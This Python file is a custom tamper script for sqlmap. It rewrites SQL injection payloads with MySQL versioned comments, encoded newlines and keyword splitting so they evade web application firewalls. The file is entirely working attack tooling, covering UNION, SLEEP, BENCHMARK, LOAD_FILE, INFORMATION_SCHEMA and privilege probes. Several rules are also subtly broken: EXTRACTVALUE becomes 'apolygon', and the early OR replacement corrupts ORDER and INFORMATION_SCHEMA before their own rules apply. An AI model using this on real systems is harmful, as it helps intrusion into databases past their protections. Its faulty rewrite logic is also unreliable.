#!/usr/bin/env python

"""
Copyright (c) 2006-2022 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import random
from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING
__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    # chars1 = ['%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0A', '%0B', '%0C', '%0D', '%0E', '%0F',
    #           '%10', '%11', '%12', '%13', '%14', '%15', '%16', '%17', '%18', '%19', '%1A', '%1B', '%1C', '%1D', '%1E', '%1F', '%20']

    # chars2 = ["/**/", "/*!*/", "/*!safe6*/"] #, "+"]

    # v = random.choice(chars1)

    if payload:
        payload = payload.replace(" ","/*!*/")
        payload = payload.replace("=","/*!*/=/*!*/")
        payload = payload.replace("AND","/*!*/AND/*!*/")
        payload = payload.replace("UNION","union/*!88888cas*/")
        payload = payload.replace('OR', '/*!14400Or*/')
        payload = payload.replace("#","/*!*/#")
        payload = payload.replace("--","/*!*/--")
        payload = payload.replace("(", "+(")
        payload = payload.replace(".", ".+")
        payload = payload.replace("SELECT","/*!88888cas*/select")
        payload = payload.replace("FROM","/*!99999c*//*!99999c*/from")
        payload = payload.replace('DATABASE(','DATABASE/*//--//*/(')
        payload = payload.replace('VERSION(','VERSION/*//--//*/(')
        payload = payload.replace('CURRENT_USER(','CURRENT_USER/*//--//*/(')
        payload = payload.replace('SYSTEM_USER(','SYSTEM_USER/*//--//*/(')
        payload = payload.replace('SESSION_USER(','SESSION_USER/*//--//*/(')
        payload = payload.replace('USER(','USER/*//--//*/(')
        payload = payload.replace('LOAD_FILE(','LOAD_FILE/*//--//*/(')
        payload = payload.replace('/AS','/--+/*%0aAS--+*/%0a')
        payload = payload.replace('INFORMATION_SCHEMA','--+/*%0aINFORMATION_SCHEMA--+*/%0a')
        payload = payload.replace("SLEEP","/*%0aSLEEP*/")
        payload = payload.replace("LIKE", "/*!%0alike*/")
        payload = payload.replace("CONCAT", "CONCAT/*%0a*/(")
        payload = payload.replace("GROUP BY", "/*%0aGROUP*/BY")
        payload = payload.replace("ORDER BY","/*%0aORDER*/BY")
        payload = payload.replace("COUNT","/*%0aCOUNT*/")
        payload = payload.replace("BENCHMARK(", "BENCHMARK/*!%0a(*/")
        payload = payload.replace("EXP", "/*%0aEXP*/")
        payload = payload.replace("EXTRACTVALUE", "/*!%0aapolygon*/")
        payload = payload.replace("UPDATEXML", "/*!%0apolygon*/")
        payload = payload.replace("VARCHAR(", "VARCHAR--%0a(")
        payload = payload.replace("CAST(", "CAST--%0a(")
        payload = payload.replace("CHR(", "CHR--%0a(")
        payload = payload.replace("WNER", "WNER--%0a")
        payload = payload.replace('super_priv','/*!29440/**/super_priv*/')

    return payload